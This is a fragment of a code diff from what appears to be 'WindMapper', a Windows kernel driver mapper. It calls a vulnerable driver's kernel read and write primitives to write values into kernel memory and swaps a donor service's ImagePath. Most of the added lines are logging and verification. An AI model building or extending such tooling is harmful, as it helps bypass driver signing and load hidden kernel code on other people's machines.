+                LOG("Donor ImagePath replacement failed status=0x%08X donor=%ls service=%ls elapsed_ms=%llu",
+                    (DWORD)regStatus,
+                    ntDonorPath,
+                    g_DriverServicePath,
+                    MapperElapsedMs(windStartTick));
             }
         }
 
+        LOG("=== WindLoadDriver END status=0x%08X elapsed_ms=%llu target_base=%p sentinel_base=%p sentinel_size=0x%X ===",
+            (DWORD)status,
+            MapperElapsedMs(windStartTick),
+            g_DriverLoadAddress,
+            g_SentinelLoadAddress,
+            g_SentinelImageSize);
         return status;
     }
 
@@ -973,8 +1371,20 @@ namespace MapperCore {
 
         PVOID baseSlotAddr = sntlKernelAddr;
         LOG("Writing WhosWho base (%p) to .sntl+0x0 (%p)...", whoswhoBase, baseSlotAddr);
+        const ULONGLONG baseWriteStart = GetTickCount64();
         status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
         LOG_STATUS("WriteKernelMemory (.sntl base slot)", status);
+        PVOID baseVerify = nullptr;
+        NTSTATUS baseVerifyStatus = VulnDriver::ReadKernelMemory(device, baseSlotAddr, &baseVerify, sizeof(PVOID));
+        LOG_STATUS("ReadKernelMemory (.sntl base verify)", baseVerifyStatus);
+        LOG("WriteSentinelGlobals base_verify write_status=0x%08X verify_status=0x%08X slot=%p value=%p expected=%p match=%u elapsed_ms=%llu",
+            (DWORD)status,
+            (DWORD)baseVerifyStatus,
+            baseSlotAddr,
+            baseVerify,
+            whoswhoBase,
+            baseVerify == whoswhoBase ? 1u : 0u,
+            MapperElapsedMs(baseWriteStart));
         if (!NT_SUCCESS(status)) {
             return FALSE;
         }
@@ -984,8 +1394,20 @@ namespace MapperCore {
             PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
                 reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
             LOG("Writing WhosWho size (0x%X) to .sntl+0x10 (%p)...", whoswhoSize, sizeSlotAddr);
+            const ULONGLONG sizeWriteStart = GetTickCount64();
             status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
             LOG_STATUS("WriteKernelMemory (.sntl size slot)", status);
+            ULONG sizeVerify = 0;
+            NTSTATUS sizeVerifyStatus = VulnDriver::ReadKernelMemory(device, sizeSlotAddr, &sizeVerify, sizeof(ULONG));
+            LOG_STATUS("ReadKernelMemory (.sntl size verify)", sizeVerifyStatus);
+            LOG("WriteSentinelGlobals size_verify write_status=0x%08X verify_status=0x%08X slot=%p value=0x%X expected=0x%X match=%u elapsed_ms=%llu",
+                (DWORD)status,
+                (DWORD)sizeVerifyStatus,
+                sizeSlotAddr,
+                sizeVerify,
+                whoswhoSize,
+                sizeVerify == whoswhoSize ? 1u : 0u,
+                MapperElapsedMs(sizeWriteStart));
         }
 
         LOG("WriteSentinelGlobals completed successfully");
@@ -1239,6 +1661,12 @@ int main(int argc, char* argv[]) {
     OpenMapperLog();
     LOG("============================================");
     LOG("WindMapper started, argc=%d", argc);
+    LOG("WindMapper process context pid=%lu tid=%lu build=%lu tick=%llu log_file_present=%u",
+        GetCurrentProcessId(),
+        GetCurrentThreadId(),
+        MapperBuildNumber(),
+        static_cast<unsigned long long>(GetTickCount64()),
+        g_LogFile ? 1u : 0u);
     for (int i = 0; i < argc; i++) {
         LOG("  argv[%d] = '%s'", i, argv[i]);
     }
